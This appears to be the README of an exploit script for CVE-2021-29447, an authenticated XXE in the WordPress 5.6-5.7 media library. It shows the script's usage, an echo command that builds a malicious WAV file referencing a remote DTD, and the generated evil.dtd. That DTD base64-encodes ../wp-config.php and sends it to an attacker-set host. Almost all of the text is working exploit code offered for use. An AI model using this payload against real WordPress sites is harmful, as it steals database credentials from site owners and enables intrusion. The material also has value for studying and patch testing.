CVE-2021-29447
WordPress 5.6-5.7 - Authenticated (Author+) XXE 

https://blog.wpsec.com/wordpress-xxe-in-media-library-cve-2021-29447/

usage:

-l LHOST     example: 127.0.0.1 
-n NAME      example: payload.wav
-dn DTD_NAME example: evil.dtd
-r READ      example: ../wp-config.php

evil-wav-dtd-xxe.py: error: the following arguments are required: -l/--lhost, -n/--name, -dn/--dtd, -r/--read

run script example:

./evil-wav-dtd-xxe.py -l 127.0.0.1 -n payload.wav -dn evil.dtd -r "../wp-config.php"



```
[*]Created: evil.dtd
-------------------------------------------------------------------------
-- below commands run in terminal directory: generate the .wav file   --
-------------------------------------------------------------------------
echo -en 'RIFF\x85\x00\x00\x00WAVEiXML\x79\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://127.0.0.1/evil.dtd'"'"'>%remote;%init;%trick;]>\x00' > payload.wav
```

evil.dtd(all generated)
```
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=../wp-config.php">
<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://127.0.0.1/?p=%file;'>" >
```
